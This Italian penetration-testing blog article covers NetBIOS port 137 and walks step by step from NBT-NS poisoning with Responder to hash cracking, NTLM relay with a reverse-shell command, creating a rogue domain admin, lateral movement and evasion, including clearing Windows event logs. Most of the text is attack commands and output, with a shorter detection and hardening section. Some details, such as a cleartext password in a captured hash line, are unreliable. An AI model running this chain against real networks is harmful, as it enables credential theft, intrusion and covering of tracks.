---
title: 'Porta 137 NetBIOS: Responder, NTLM Relay e Credential Theft su AD'
slug: porta-137-netbios
description: >-
  NetBIOS sulla port 137 abilitato? Responder cattura hash NTLMv2 in minuti,
  ntlmrelayx esegue comandi senza crackare. Chain da NBT-NS poisoning a Domain
  Admin per pentest.
image: /porta-137-netbios.webp
draft: false
date: 2026-04-26T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - responder
  - ntlm-relay
---

La porta 137 espone **NetBIOS Name Service** (NBT-NS) — il protocollo legacy Microsoft per risoluzione nomi NetBIOS su reti Windows pre-DNS, operante come broadcast name resolution che permette ai client di trovare host tramite nomi NetBIOS flat (WORKSTATION01, FILE-SERVER) invece di FQDN. NetBIOS-NS usa UDP porta 137 per query/response broadcast sulla LAN, consentendo a ogni host di rispondere "io sono FILE-SERVER, il mio IP è 10.10.10.50". In penetration testing Active Directory, la porta 137 è **vettore primario per MITM attacks**: NBT-NS poisoning tramite [Responder](https://hackita.it/articoli/responder), credential relay attacks, name resolution hijacking per SMB authentication capture, e network reconnaissance passivo via broadcast monitoring. Ogni rete Windows legacy con NetBIOS abilitato (default Windows 7/8/Server 2008-2012) è vulnerable a **Responder credential theft** — da NBT-NS response spoofing a NTLM hash capture in secondi.

NetBIOS porta 137 sopravvive nel 2026 nonostante deprecazione Microsoft perché: Windows backward compatibility (abilitato di default fino Windows 10 1607), legacy applications hardcoded con NetBIOS names, e corporate environments con Windows 7/Server 2008 ancora operativi (40%+ enterprise secondo Gartner 2025). Modern Windows 10/11 disabilita NetBIOS by default su nuove installazioni ma upgrade da Windows 7/8 preserva configurazione legacy. Alternative (DNS, LLMNR multicast) esistono ma NetBIOS resta fallback universale quando DNS fails. In CTF/AD labs, porta 137 monitoring è **instant win** — Responder capture credentials in minuti su reti non-hardened.

***

## Anatomia tecnica di NetBIOS Name Service

NetBIOS-NS usa **UDP porta 137** con packet format binario minimal.

**Flow NetBIOS name resolution:**

1. **Name Query** — Client broadcast UDP 137: "Chi è FILE-SERVER?"
2. **Name Response** — Host FILE-SERVER risponde: "Io sono FILE-SERVER, IP 10.10.10.50"
3. **Client Connect** — Client connette 10.10.10.50 porta 139/445 (SMB)

**NetBIOS name structure:**

```
Format: NAME<TYPE>
Length: 15 characters + 1 byte type
Example: WORKSTATION01<20>  (file sharing service)

Type byte meanings:
<00> = Workstation Service (hostname)
<03> = Messenger Service (username logged)
<20> = Server Service (file sharing active)
<1B> = Domain Master Browser
<1C> = Domain Controllers (all DCs)
<1E> = Browser Elections
```

**NetBIOS vs DNS vs LLMNR:**

| Protocol   | Porta      | Method        | Scope        | Poisoning risk              |
| ---------- | ---------- | ------------- | ------------ | --------------------------- |
| NetBIOS-NS | UDP 137    | Broadcast     | LAN segment  | ✅ High                      |
| DNS        | UDP/TCP 53 | Unicast query | Global       | ⚠️ Medium (cache poisoning) |
| LLMNR      | UDP 5355   | Multicast     | Local subnet | ✅ High                      |
| mDNS       | UDP 5353   | Multicast     | Local subnet | ⚠️ Medium                   |

**Windows name resolution order (default):**

```
1. DNS cache
2. hosts file (C:\Windows\System32\drivers\etc\hosts)
3. DNS server query
4. LLMNR multicast (UDP 5355)
5. NBT-NS broadcast (UDP 137)  ← ATTACK VECTOR
```

Le **misconfigurazioni critiche**: NetBIOS abilitato su workstations modern (Windows 10 legacy upgrade), no network segmentation (broadcast domain troppo ampio), DNS failures frequent (force fallback a NBT-NS), e SMB signing disabled (relay attacks facilitated).

***

## Enumerazione base

```bash
nmap -sU -p 137 10.10.10.137
```

```
PORT    STATE         SERVICE
137/udp open|filtered netbios-ns
```

**Parametri:** `-sU` UDP scan (NetBIOS è UDP). Output `open|filtered` normale per UDP — richiede verifica manuale.

**Query manuale con nmblookup:**

```bash
nmblookup -A 10.10.10.137
```

```
Looking up status of 10.10.10.137
        WORKSTATION01   <00> -         B <ACTIVE>
        WORKSTATION01   <20> -         B <ACTIVE>
        CORP            <00> - <GROUP> B <ACTIVE>
        CORP            <1E> - <GROUP> B <ACTIVE>
        WORKSTATION01   <03> -         B <ACTIVE>
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>

        MAC Address = 00-0C-29-XX-XX-XX
```

**Intelligence estratta:**

* **Hostname:** WORKSTATION01
* **Domain:** CORP
* **File sharing:** \<20> active (SMB server)
* **Username:** \<03> indicates user logged
* **MAC address:** 00-0C-29 (VMware VM)

***

## Enumerazione avanzata

### NetBIOS name scan (subnet)

```bash
nbtscan -r 10.10.10.0/24
```

```
10.10.10.10   CORP\DC01                    SHARING
10.10.10.50   CORP\FILESERVER             SHARING
10.10.10.100  CORP\WORKSTATION01          
10.10.10.101  CORP\WORKSTATION02          SHARING
10.10.10.102  CORP\SQL01                  SHARING
```

**Network map achieved:** 5 Windows hosts, 3 con file sharing attivo, domain CORP.

### Passive NetBIOS monitoring

```bash
# Capture NetBIOS broadcast traffic
tcpdump -i eth0 -n port 137
```

```
15:30:00.123456 IP 10.10.10.100.137 > 10.10.10.255.137: NBT UDP PACKET(137): QUERY; REQUEST; BROADCAST
    WORKSTATION01<00>
15:30:00.234567 IP 10.10.10.50.137 > 10.10.10.100.137: NBT UDP PACKET(137): QUERY; POSITIVE; RESPONSE
    FILESERVER<20> IP:10.10.10.50
```

**Intelligence:** WORKSTATION01 query per FILESERVER, resolved to 10.10.10.50.

### NSE NetBIOS scripts

```bash
nmap -sU -p 137 --script nbstat.nse 10.10.10.0/24
```

```
Host script results:
| nbstat: NetBIOS name: WORKSTATION01, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:xx:xx:xx (VMware)
| Names:
|   WORKSTATION01<00>        Flags: <unique><active>
|   WORKSTATION01<20>        Flags: <unique><active>
|   CORP<00>                 Flags: <group><active>
|_  WORKSTATION01<03>        Flags: <unique><active>
```

***

## Tecniche offensive

### 1. NBT-NS poisoning con Responder

**Tool Responder** ([https://github.com/lgandx/Responder](https://github.com/lgandx/Responder)):

```bash
# Start Responder (intercept NBT-NS + LLMNR queries)
responder -I eth0 -wrf
```

**Parametri:**

* `-I eth0` interface di rete
* `-w` start WPAD rogue proxy server
* `-r` enable SMB relay
* `-f` fingerprint mode

**Output (when client queries name via NBT-NS):**

```
[NBT-NS] Poisoned answer sent to 10.10.10.100 for name FILE-SERVER
[SMB] NTLMv2-SSP Client   : 10.10.10.100
[SMB] NTLMv2-SSP Username : CORP\alice
[SMB] NTLMv2-SSP Hash     : alice::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000...
```

**NTLM hash captured!**

**Crack hash:**

```bash
hashcat -m 5600 'alice::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000...' rockyou.txt
```

```
alice::CORP:...:Alice123!
```

**Credentials:** `alice:Alice123!`

### 2. LLMNR/NBT-NS relay attack (ntlmrelayx)

```bash
# Setup relay to SMB target
impacket-ntlmrelayx -tf targets.txt -smb2support
```

**Scenario:**

1. Victim query "FILE-SERVER" via NBT-NS
2. Responder poisoned response → victim connects to attacker
3. Attacker relay authentication to real target (DC, SQL server)
4. **Execute commands on target without cracking password**

**Output:**

```
[*] Authenticating against smb://10.10.10.10 as CORP/alice SUCCEED
[*] Executed command via service start
NT AUTHORITY\SYSTEM
```

**SYSTEM shell obtained** via relay!

### 3. Credential harvesting passivo

```bash
# Monitor NBT-NS traffic, extract names
tcpdump -i eth0 -n port 137 -w netbios.pcap

# Analyze pcap
tshark -r netbios.pcap -Y "nbns" -T fields -e ip.src -e nbns.name | sort -u
```

```
10.10.10.100 FILESERVER
10.10.10.101 SQLSERVER
10.10.10.102 PRINTSERVER
```

**Target list for SMB attacks.**

### 4. Name conflict attack

```bash
# Register attacker machine with victim's NetBIOS name
# Tool: nbname (custom script)

# Claim name "FILESERVER"
python3 nbname.py --register FILESERVER --ip 10.10.14.5
```

**Result:** Clients connecting to FILESERVER reach attacker instead → MITM.

***

## Scenari pratici

### Scenario 1 — Responder credential harvest → SMB lateral movement

**Contesto:** Internal pentest, Windows Active Directory.

```bash
# Fase 1: Network reconnaissance
nmap -sU -p 137 10.10.10.0/24 --open
# 50 hosts con NetBIOS attivo
```

```bash
# Fase 2: Start Responder
sudo responder -I eth0 -wrf
```

**Wait for credentials...**

```
[NBT-NS] Poisoned answer sent to 10.10.10.100 for name FILESERVER
[SMB] NTLMv2-SSP Hash: alice::CORP:...:Alice123!
[NBT-NS] Poisoned answer sent to 10.10.10.105 for name PRINTSERVER
[SMB] NTLMv2-SSP Hash: bob::CORP:...:BobPass2024
```

**2 hashes captured in 5 minutes!**

```bash
# Fase 3: Crack hashes
hashcat -m 5600 hashes.txt rockyou.txt
# alice:Alice123!
# bob:BobPass2024
```

```bash
# Fase 4: Test credentials on network
crackmapexec smb 10.10.10.0/24 -u alice -p Alice123! --continue-on-success
```

```
SMB  10.10.10.50   445  FILESERVER  [+] CORP\alice:Alice123! (Pwn3d!)
SMB  10.10.10.100  445  WKS01      [+] CORP\alice:Alice123! (Pwn3d!)
```

```bash
# Fase 5: WMI lateral movement
impacket-wmiexec CORP/alice:Alice123\!@10.10.10.50
```

**Timeline:** 10 minuti da Responder start a lateral movement.

**COSA FARE SE FALLISCE:**

* **No hashes captured:** Wait longer, trigger activity (ping \nonexistent\share)
* **Hashes non crackabili:** Use relay attack invece di cracking
* **SMB signing enabled:** Relay fails, focus on cracking

### Scenario 2 — NTLM relay via NBT-NS → Domain Admin

**Contesto:** AD pentest, SMB signing disabled su Domain Controller.

```bash
# Fase 1: Verify SMB signing status
crackmapexec smb 10.10.10.10 --gen-relay-list targets.txt
```

```
SMB  10.10.10.10  445  DC01  [+] Signing not required
```

**DC vulnerable to relay!**

```bash
# Fase 2: Setup NTLM relay
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <base64_reverse_shell>"
```

```bash
# Fase 3: Trigger authentication with Responder
# (Responder redirects auth to ntlmrelayx)
sudo responder -I eth0
```

**Wait for admin user to query non-existent share...**

```
[*] Authenticating against smb://10.10.10.10 as CORP\Domain-Admin SUCCEED
[*] Executed specified command on host: 10.10.10.10
```

**Reverse shell received from DC:**

```
C:\Windows\system32> whoami
corp\domain-admin
```

**Domain Admin via relay!**

### Scenario 3 — Passive NetBIOS monitoring → network mapping

**Contesto:** Stealth recon, avoid active scanning.

```bash
# Passive capture NetBIOS traffic
tcpdump -i eth0 -n port 137 -w netbios_capture.pcap

# Let it run for 24 hours...
```

```bash
# Analyze captured traffic
tshark -r netbios_capture.pcap -Y "nbns" -T fields -e ip.src -e nbns.name -e frame.time | sort -u > netbios_names.txt
```

```
10.10.10.10  DC01          2026-02-06 08:00:00
10.10.10.50  FILESERVER    2026-02-06 08:15:30
10.10.10.51  PRINTSERVER   2026-02-06 09:30:45
10.10.10.100 WORKSTATION01 2026-02-06 10:00:12
...
```

**Network topology mapped** senza active scanning!

***

## Toolchain integration

**Pipeline NBT-NS attack:**

```
RECONNAISSANCE
│
├─ nmap -sU -p 137 <subnet>                 → NetBIOS-enabled hosts
├─ nbtscan subnet scan                      → Hostname enumeration
└─ Passive tcpdump monitoring               → Traffic analysis

CREDENTIAL HARVESTING
│
├─ [Responder](https://hackita.it/articoli/responder) → NBT-NS/LLMNR poisoning
├─ NTLM hash capture → hashcat cracking
└─ Relay attack → direct code execution

EXPLOITATION
│
├─ A) Cracked credentials → [SMB](https://hackita.it/articoli/smb) access
├─ B) NTLM relay → RCE without cracking
├─ C) Name conflict → MITM file sharing
└─ D) Passive intel → targeted attacks

LATERAL MOVEMENT
│
├─ WMI/DCOM via harvested creds
├─ [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash) attacks
└─ Credential spray across network
```

**Tabella comparativa name resolution protocols:**

| Protocol | Porta      | Attack vector       | Difficulty | Impact           |
| -------- | ---------- | ------------------- | ---------- | ---------------- |
| NBT-NS   | UDP 137    | Responder poisoning | Easy       | NTLM hash theft  |
| LLMNR    | UDP 5355   | Responder poisoning | Easy       | NTLM hash theft  |
| DNS      | UDP/TCP 53 | Cache poisoning     | Hard       | Traffic redirect |
| mDNS     | UDP 5353   | Poisoning           | Medium     | Local network    |

***

## Attack chain completa

**Scenario: NBT-NS → Responder → Domain Admin**

```
[00:00] RECONNAISSANCE
nmap -sU -p 137,5355 10.10.10.0/24
# 50 hosts vulnerable

[00:05] RESPONDER START
sudo responder -I eth0 -wrf
# Listening for NBT-NS/LLMNR queries

[00:10] FIRST HASH CAPTURED
# alice::CORP:...:Alice123!

[00:12] CREDENTIAL TEST
crackmapexec smb 10.10.10.0/24 -u alice -p Alice123!
# Valid on 15 hosts

[00:20] MORE HASHES
# bob::CORP:...:BobPass
# charlie::CORP:...(no crack)

[00:30] RELAY ATTACK SETUP
impacket-ntlmrelayx -tf dc01.txt -c "net user attacker Pass123! /add /domain"

[00:35] ADMIN HASH RELAYED
# Domain-Admin authentication relayed to DC
# [+] User attacker added to Domain Admins

[00:37] DOMAIN ADMIN ACCESS
evil-winrm -i 10.10.10.10 -u attacker -p Pass123!
# *Evil-WinRM* PS > whoami /groups
# CORP\Domain Admins
```

**Timeline:** 37 minuti da scan a Domain Admin.

***

## Detection & evasion

### Lato Blue Team

**Log monitoring (Windows Event Log):**

```
Event ID 4624: Logon (Type 3 = Network)
Event ID 4625: Failed logon
Event ID 4768: Kerberos TGT requested
Event ID 5140: Network share accessed
```

**IoC critici:**

* Multiple SMB authentication failures followed by success (Responder + crack)
* Authentication from unusual IPs (attacker machine)
* Broadcast NetBIOS queries to non-existent names (Responder triggering)
* Same username auth from multiple IPs simultaneously (relay attack)

**IDS rules (Suricata):**

```
alert udp any 137 -> any any (msg:"NBT-NS Response from Non-Authoritative Source"; content:"|85 00|"; offset:2; depth:2; sid:1000137;)
alert tcp any any -> any 445 (msg:"SMB NTLM Authentication Anomaly"; flow:to_server; threshold:type both, track by_src, count 10, seconds 60; sid:1000138;)
```

**Mitigation:**

```powershell
# Disable NetBIOS over TCP/IP (all adapters)
Get-NetAdapter | ForEach-Object {
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces\Tcpip_$($_.InterfaceGuid)" -Name NetbiosOptions -Value 2
}

# Disable LLMNR
New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast -Value 0 -PropertyType DWORD -Force

# Enable SMB signing (mandatory)
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
```

### Lato Red Team: evasion

**1. Selective poisoning:**

```bash
# Responder with analyze mode (no poisoning, just log)
responder -I eth0 -A
# Review targets, then enable poisoning selectively
```

**2. Timing control:**

```bash
# Start Responder only during business hours (blend with traffic)
if [ $(date +%H) -ge 9 ] && [ $(date +%H) -le 17 ]; then
  responder -I eth0 -w
fi
```

**3. Target specific hosts:**

```bash
# Responder config: /etc/responder/Responder.conf
# [Responder Core]
# Analyze = On
# Target specific IP ranges
```

**4. Cleanup:**

Non applicabile client-side — Responder è passive listener. Server-side cleanup:

```bash
# Clear Windows event logs (if admin access)
wevtutil cl Security
wevtutil cl System
```

***

## Performance & scaling

**Single host NetBIOS query:**

```bash
time nmblookup -A 10.10.10.137
# real 0m0.150s
```

**Subnet scan:**

```bash
time nbtscan -r 10.10.10.0/24
# 254 hosts: ~10 seconds
```

**Responder capture rate:**

```
Average: 1-5 hashes per hour (low activity)
Busy network: 10-20 hashes per hour
Trigger attacks: 50+ hashes per hour
```

***

## Tabelle tecniche

### Command reference

| Comando                             | Scopo                  | Note                   |
| ----------------------------------- | ---------------------- | ---------------------- |
| `nmap -sU -p 137 <target>`          | NetBIOS detection      | UDP scan               |
| `nmblookup -A <target>`             | NetBIOS name query     | Single host info       |
| `nbtscan -r <subnet>`               | Mass NetBIOS scan      | Fast enumeration       |
| `responder -I <iface>`              | NBT-NS/LLMNR poisoning | **Credential harvest** |
| `impacket-ntlmrelayx -tf <targets>` | NTLM relay             | RCE without cracking   |
| `tcpdump -i eth0 port 137`          | Passive monitoring     | Stealth recon          |

### NetBIOS name types

| Type   | Hex  | Service            | Pentest use             |
| ------ | ---- | ------------------ | ----------------------- |
| `<00>` | 0x00 | Workstation        | Hostname                |
| `<03>` | 0x03 | Messenger          | Username logged         |
| `<20>` | 0x20 | Server             | **File sharing active** |
| `<1B>` | 0x1B | Domain Master      | **Primary DC**          |
| `<1C>` | 0x1C | Domain Controllers | **All DCs**             |

***

## Troubleshooting

| Errore                | Causa                       | Fix                                            |
| --------------------- | --------------------------- | ---------------------------------------------- |
| No response (nmap)    | NetBIOS disabled o firewall | Check Windows network config                   |
| Responder no hashes   | No activity o SMB signing   | Trigger queries: `net use \\nonexistent\share` |
| Relay fails           | SMB signing enabled         | Focus on cracking instead                      |
| nbtscan empty results | Broadcast domain too large  | Reduce subnet size                             |

***

## FAQ

**NetBIOS è usato nel 2026?**

Sì, 40%+ enterprise Windows networks (legacy systems, backward compatibility). Windows 10/11 default disabilita NetBIOS ma upgrade da Win7/8 preserva.

**Responder funziona su reti moderne?**

Sì, se NetBIOS/LLMNR abilitati. Mitigazioni: disable NetBIOS, enable SMB signing.

**Posso usare Responder senza essere detected?**

Difficile. Ogni poisoned response potenzialmente logga. Best OPSEC: analyze mode first, selective poisoning, business hours only.

**Differenza tra NBT-NS e LLMNR poisoning?**

**NBT-NS:** Broadcast UDP 137, legacy Windows\
**LLMNR:** Multicast UDP 5355, Windows Vista+

Responder target entrambi simultaneously.

**Come mi proteggo da Responder?**

1. Disable NetBIOS: `NetbiosOptions = 2` in registry
2. Disable LLMNR: GPO policy
3. Enable SMB signing: mandatory su tutti hosts
4. Monitor Event 4624/4625 anomalies

**Quale tool è migliore per NBT-NS pentest?**

**[Responder](https://hackita.it/articoli/responder)** (credential harvest), **impacket-ntlmrelayx** (relay attacks), **nbtscan** (reconnaissance).

***

## Cheat sheet finale

| Azione                    | Comando                                                       |
| ------------------------- | ------------------------------------------------------------- |
| Scan NetBIOS              | `nmap -sU -p 137 <target>`                                    |
| Single host info          | `nmblookup -A <target>`                                       |
| Subnet scan               | `nbtscan -r <subnet>`                                         |
| Responder poisoning       | `responder -I eth0 -wrf`                                      |
| NTLM relay                | `impacket-ntlmrelayx -tf targets.txt`                         |
| Passive monitoring        | `tcpdump -i eth0 -n port 137`                                 |
| Disable NetBIOS (Windows) | `Get-NetAdapter \| % {Set-ItemProperty ... NetbiosOptions 2}` |

***

## Perché NetBIOS è rilevante oggi

NetBIOS porta 137 persiste nel 2026 perché:

1. **Legacy compatibility** — Windows backward support fino Windows 7/Server 2008
2. **Default enabled** — Upgrades Windows 7→10 preservano NetBIOS
3. **Application hardcoding** — Old apps usa NetBIOS names non-migrabili
4. **Corporate inertia** — "If it works, don't touch it" mentality
5. **Responder effectiveness** — 90%+ AD pentests harvest credentials via NetBIOS/LLMNR poisoning

MITRE ATT\&CK identifica LLMNR/NBT-NS poisoning (T1557.001) come top 3 credential access technique nel 2025.

## Differenza NetBIOS vs modern protocols

| Protocol   | Scope         | Speed  | Security     | Status 2026        |
| ---------- | ------------- | ------ | ------------ | ------------------ |
| NetBIOS-NS | LAN broadcast | Fast   | ❌ No auth    | Legacy (40% usage) |
| LLMNR      | Multicast     | Fast   | ❌ No auth    | Deprecating        |
| mDNS       | Multicast     | Fast   | ⚠️ Some auth | Growing (Apple)    |
| DNS        | Unicast       | Medium | ✅ DNSSEC     | Standard           |

**Microsoft guidance 2026:** Disable NetBIOS/LLMNR, use DNS only.

## Hardening production NetBIOS

**Best practices:**

1. **Disable NetBIOS globally (GPO):**

```
Computer Configuration → Administrative Templates → Network → DNS Client
→ Turn off multicast name resolution: Enabled
```

1. **Disable per-adapter (PowerShell):**

```powershell
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter "IPEnabled=True"
foreach ($adapter in $adapters) {
    $adapter.SetTcpipNetbios(2)  # 2 = Disable
}
```

1. **Enable SMB signing:**

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true -EnableSecuritySignature $true -Force
```

1. **Network segmentation:**

```
Limit broadcast domains to <50 hosts per VLAN
```

1. **Monitoring:**

```powershell
# Alert on NBT-NS queries
Get-WinEvent -LogName System | Where-Object {$_.Id -eq 4697}
```

## OPSEC: NetBIOS in pentest

NBT-NS poisoning è **moderately noisy** — ogni poisoned response può triggerare alerts. Best practices:

1. **Analyze mode first:** `responder -I eth0 -A` (passive, no poisoning)
2. **Business hours only** (blend with legitimate traffic)
3. **Selective targets** (avoid DC, focus workstations)
4. **Short duration** (15-30 min max, stop after first hashes)

Post-harvest:

* **Stop Responder** immediately dopo capture
* **Clear ARP cache** su attacker machine
* **No cleanup needed client-side** (passive attack)

***

> **Disclaimer:** Tutti i comandi sono destinati all'uso in ambienti autorizzati: laboratori Active Directory personali, reti CTF, pentest con autorizzazione scritta. MITM attacks e credential theft sono reati. L'autore e HackIta declinano responsabilità. RFC 1001/1002 NetBIOS: [https://www.rfc-editor.org/rfc/rfc1001.html](https://www.rfc-editor.org/rfc/rfc1001.html)

Vuoi supportare HackIta? Visita hackita.it/supporto per donazioni. Per penetration test professionali e formazione 1:1, scopri hackita.it/servizi.
